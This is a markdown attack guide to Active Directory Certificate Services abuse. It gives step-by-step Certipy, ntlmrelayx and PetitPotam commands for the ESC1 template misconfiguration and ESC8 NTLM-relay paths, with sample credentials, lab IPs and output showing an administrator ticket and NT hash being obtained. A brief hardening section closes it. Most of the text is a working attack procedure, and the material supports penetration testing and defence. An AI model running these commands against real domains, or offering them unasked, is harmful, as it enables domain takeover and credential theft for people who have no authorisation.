# 📜 Active Directory Certificate Services (AD CS) Attacks

Active Directory Certificate Services (AD CS) is Microsoft’s Public Key Infrastructure (PKI) implementation for Windows domains. Misconfigured certificate templates and insecure web enrollment endpoints represent one of the most reliable and stealthy paths to full Domain Administrator takeover.

---

### AD CS Core Architecture

```text
[Client / Domain User]
       │
       │  1. Certificate Enrollment Request (RPC or HTTP)
       ▼
[Enterprise Certificate Authority (CA)]
       │
       │  2. Evaluates Certificate Template Settings
       │     (Does template allow Client Authentication? Can user specify SAN?)
       ▼
[X.509 Digital Certificate Issued (.pfx)]
       │
       │  3. PKINIT Authentication over Kerberos (Port 88)
       ▼
[KDC / Domain Controller] ===> [Domain Administrator TGT Issued!]
```

---

### ESC1: Misconfigured Certificate Template (Enrollee Supplies SAN)

#### Vulnerability Conditions
A template is vulnerable to **ESC1** when:
1. `mspki-certificate-name-flag` contains `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (allows the requester to supply an arbitrary **Subject Alternative Name (SAN)**, such as `Administrator`).
2. `ExtendedKeyUsage (EKU)` contains `Client Authentication` or `Smart Card Logon`.
3. Standard authenticated domain users have enrollment rights (`Enroll` permission).

#### Execution with Certipy

```bash
# 1. Enumerate vulnerable certificate templates across the domain
certipy find -u 'jdoe@corp.local' -p 'Welcome2025!' -dc-ip 192.168.56.10 -vulnerable

# 2. Request a certificate on behalf of the Domain Administrator
certipy req -u 'jdoe@corp.local' -p 'Welcome2025!' -ca 'CORP-CA' \
  -template 'VulnerableTemplate' -upn 'administrator@corp.local' \
  -dc-ip 192.168.56.10

# 3. Authenticate with the obtained certificate via PKINIT to request a TGT
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
```

*Output:*
```text
[*] Got TGT for 'administrator@corp.local'
[*] Saving credential cache to 'administrator.ccache'
[*] Saved NT hash: aad3b435b51404eeaad3b435b51404ee:afff6209e51e70e9f80...
```

---

### ESC8: NTLM Relay to AD CS HTTP Web Enrollment

#### Attack Mechanics
Many enterprise CAs have the **Active Directory Certificate Services Web Enrollment** feature installed (at `http://<CA_SERVER>/certsrv/`).

By default, these HTTP endpoints **do not enforce Extended Protection for Authentication (EPA)** and have **HTTP signing disabled**. An attacker can coerce authentication from a Domain Controller (via PetitPotam / MS-EFSRPC) and relay the NTLM authentication to the CA Web Enrollment endpoint to generate a machine certificate for the DC.

```text
[Attacker (PetitPotam)] ---- 1. MS-EFSRPC Coercion Request ----> [Domain Controller]
                                                                        |
[Attacker (ntlmrelayx)] <--- 2. NTLM Authentication from DC ------------+
        |
        +--- 3. Forward NTLM to AD CS Web Enrollment (HTTP) ---> [CA Server /certsrv]
                                                                        |
[Attacker] <--- 4. Machine Certificate (.pfx) for DC Returned ----------+
        |
        +--- 5. PKINIT to KDC ---> Domain Controller Compromised!
```

#### Step-by-Step Execution

```bash
# 1. Start ntlmrelayx targeting the CA Web Enrollment HTTP endpoint
ntlmrelayx.py -t http://192.168.56.15/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. In another terminal, coerce authentication from the Domain Controller
python3 PetitPotam.py -u 'jdoe' -p 'Welcome2025!' 192.168.56.5 192.168.56.10

# 3. ntlmrelayx intercepts the DC's machine account NTLM and outputs base64 certificate
# 4. Authenticate using the base64 certificate to get the DC's NT hash
certipy auth -pfx dc01.pfx -dc-ip 192.168.56.10
```

---

### Defensive Mitigation & Hardening

> [!NOTE]
> 1. **EPA Enforcement**: Enable **Extended Protection for Authentication (EPA)** and require **SSL (HTTPS)** for the AD CS Web Enrollment service in IIS.
> 2. **Template Auditing**: Review certificate templates. Never combine `Client Authentication` EKU with the `Enrollee Supplies Subject` flag (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) unless strict manager approval workflows are enforced.
> 3. **Disable Web Enrollment**: If not required for legacy business workflows, uninstall the `Certification Authority Web Enrollment` role service completely.
